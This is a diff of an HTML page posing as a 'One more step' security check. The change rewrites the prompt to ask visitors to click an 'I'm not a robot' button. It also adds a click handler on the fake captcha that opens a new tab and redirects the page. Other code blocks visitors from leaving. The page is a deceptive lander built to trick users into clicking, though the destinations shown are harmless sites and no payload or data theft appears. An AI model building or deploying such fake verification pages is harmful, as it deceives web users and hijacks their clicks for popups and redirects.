@@ -25,7 +25,7 @@ window.addEventListener('beforeunload', (event) => { event.preventDefault(); eve
 <style> .box-main { animation: shake-animation 2s ease infinite; width: 90%!important; font-size: 20px; line-height: 1.42857143; font-family: open sans, helvetica neue, Helvetica, Arial, sans-serif; color: #097969; box-sizing: border-box; background-color: #f5f5f5; border-top: 5px solid #40B5AD; border-radius: 8px; padding: 50px 0; text-align: center; margin-bottom: 20px; } .cc { top: auto; left: 0; right: 0; display: flex; justify-content: center; } </style>
 
 <div class="wrapper">
-<div class="textOK" style="color: black;"><h3 style="font-family: Arial, Helvetica, sans-serif!important; -webkit-text-size-adjust: 100%; font-size: 40px; width: 90%; margin-left: auto; margin-right: auto; margin-bottom: 20px!important; margin-top: 0!important;text-align: center; letter-spacing: 1px;"><span style="font-weight: bold;">One more step</span></h3><h4 style="font-family: Arial, Helvetica, sans-serif!important; -webkit-text-size-adjust: 100%; text-align: center; width: auto; margin-left: auto; margin-right: auto; margin-top: 20px!important; margin-bottom: 40px!important; font-size: 25px; letter-spacing: 1px;"><span style="font-weight: normal;">Please complete security check to continue</span></h4></div>
+<div class="textOK" style="color: black;"><h3 style="font-family: Arial, Helvetica, sans-serif!important; -webkit-text-size-adjust: 100%; font-size: 40px; width: 90%; margin-left: auto; margin-right: auto; margin-bottom: 20px!important; margin-top: 0!important;text-align: center; letter-spacing: 1px;"><span style="font-weight: bold;">One more step</span></h3><h4 style="font-family: Arial, Helvetica, sans-serif!important; -webkit-text-size-adjust: 100%; text-align: center; width: auto; margin-left: auto; margin-right: auto; margin-top: 20px!important; margin-bottom: 40px!important; font-size: 25px; letter-spacing: 1px;"><span style="font-weight: normal;">Please click I'm not a robot button to continue !</span></h4></div>
 <div class="cc">
 <div class="box-main">
 <div class="llo">
@@ -162,6 +162,13 @@ window.addEventListener('beforeunload', (event) => { event.preventDefault(); eve
 @keyframes shake-animation { 0% { transform:translate(0,0) } 1.78571% { transform:translate(5px,0) } 3.57143% { transform:translate(0,0) } 5.35714% { transform:translate(5px,0) } 7.14286% { transform:translate(0,0) } 8.92857% { transform:translate(5px,0) } 10.71429% { transform:translate(0,0) } 100% { transform:translate(0,0) } }
 </style>
 <script> document.querySelector('body').onload = function(){ document.querySelector(".textOK").style.color = "white"; }; </script>
+
+<script>
+document.querySelector(".captchaContainer").onclick = function () {
+document.write('<script> window.onbeforeload = null; <\/script>'); sessionStorage.setItem("click", 500); window.open("https://duckduckgo.com", "_blank"); setTimeout(function assign() { window.location.assign("https://google.com"); }, 0);
+return true;
+};
+</script>
 
 </body>
 </html>
